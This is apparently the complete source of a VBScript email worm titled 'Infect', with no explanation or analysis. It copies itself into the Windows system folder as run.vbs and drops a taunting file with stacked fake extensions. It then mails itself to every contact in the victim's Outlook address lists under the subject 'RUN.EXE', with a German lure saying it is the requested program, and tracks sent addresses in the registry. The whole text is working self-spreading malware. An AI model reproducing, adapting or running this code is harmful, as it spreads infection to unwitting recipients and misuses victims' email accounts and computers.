Infect
Sub Infect()

Dim fso, win, sys, c, text
Set fso = CreateObject("Scripting.FileSystemObject")
Set sys = fso.GetSpecialFolder(1)
Set win = fso.GetSpecialFolder(0)
Set c = fso.GetFile(WScript.ScriptFullName)
c.copy (sys&"\run.vbs")
Set file = fso.CreateTextFile(win& "\IgotYOU.txt.com.bat.doc.pif.exe.mp2.mpeg.jpg.mp2.inf.ini.vir.dat.sys.dll.htm.htt.vbs")
file.WriteLine "' I Got YOU *hahahahaha*"

mail
End Sub

Sub mail()

On Error Resume Next
Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
Set regedit = CreateObject("WScript.Shell")
Set out = WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
For ctrlists = 1 To mapi.AddressLists.Count
Set a = mapi.AddressLists(ctrlists)
x = 1
regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
If (regv = "") Then
regv = 1
End If
If (Int(a.AddressEntries.Count) > Int(regv)) Then
For ctrentries = 1 To a.AddressEntries.Count
malead = a.AddressEntries(x)
regad = ""
regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead)
If (regad = "") Then
Set male = out.CreateItem(0)
male.Recipients.Add (malead)
male.Subject = "RUN.EXE"
male.Body = "Hi, hier ist das gewünschte Programm!"
male.Attachments.Add (sys& "\Run.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
End If
x = x + 1
Next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
Else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
End If
Next
Set out = Nothing
Set mapi = Nothing

End Sub
